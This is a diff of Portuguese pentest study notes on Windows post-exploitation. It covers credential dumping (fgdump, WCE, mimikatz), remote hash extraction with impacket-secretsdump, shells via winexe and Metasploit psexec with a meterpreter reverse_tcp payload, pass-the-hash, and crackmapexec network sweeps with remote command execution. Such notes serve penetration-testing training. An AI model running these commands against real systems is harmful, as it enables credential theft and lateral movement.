@@ -170,7 +170,7 @@ vssadmin - utilitario para criar uma copia sombra dos volumes que tem no windows
 
 Obtendo hashes e senhas em cache
 
-**fgdump**
+**FGDUMP**
 
 fgdump.exe --> Permite conseguir acessar informações que estão na cache, credenciais. 
 
@@ -178,7 +178,7 @@ type arquivo.pwdump
 
 type arquivo.cachedump
 
-**WCE **
+**WCE**
 
 wce-universal.exe --> Ler informações de cache e exibe credenciais em texto claro.
 
@@ -198,7 +198,99 @@ meterpreter > mimikatz_command -f sekurlsa::serchPasswords
 
 meterpreter > mimikatz_command -f sekurlsa::logonPasswords
 
+
+
+
 ## Validando as credenciais obtidas
+
+**SMBCLIENT**
+
+`smbclient -L \\x.x.x.x -U usuario`
+
+**RDP**
+
+`xfreerdp /u:usuario /p:password /v:x.x.x.x`
+
+
+
+
+
+## Obtendo hashes remotamente
+
+`impacket-secretsdum usuario:password@x.x.x.x`
+
+
+
+
+## Obtendo shell no host
+
+**WINEXE**
+
+`winexe`
+
+`winexe -U usuario%password //x.x.x.x cmd.exe`
+
+**PSEXEC**
+
+`msf5 exploit(windows/smb/psexec)`
+
+`set SMBDomain ...`
+
+`set SMBPass ...`
+
+`set SMBUser ...`
+
+`Payload Options (windows/x64/meterpreter/reverse_tcp)`
+
+
+
+
+## Pass the Hash
+
+**PTH-WINEXE**
+
+*Obs: Acessando maquina alvo sem quebrar hashe.*
+
+`pth-winexe -U usuario%...HASHE... //x.x.x.x cmd.exe`
+
+**PSEXEC**
+
+`msf5 exploit(windows/smb/psexec)`
+
+`set SMBDomain ...`
+
+`set SMBPass ...HASHE...`
+
+`set SMBUser ...`
+
+`Payload Options (windows/x64/meterpreter/reverse_tcp)`
+
+
+
+
+## Swiss Army Knife para Pentest
+
+**CRACKMAPEXEC** - Canivete suiço.
+
+`apt install crackmapexec`
+
+Listando hosts na rede que possuem serviços samba.
+
+`crackmapexec smb 192.168.0.0/24` 
+
+Testando credenciais em servidores que possuem smb e o usuario enviado tem acesso.
+
+`crackmapexec smb 192.168.0.0/24 -u usuario -p 'password'`
+
+Executando comando de forma direta
+
+`crackmapexec smb 192.168.0.0/24 -u usuario -p 'password' -x 'whoami'`
+
+
+
+
+## Ataque: NBT-NS / LLMNR
+
 
 
 
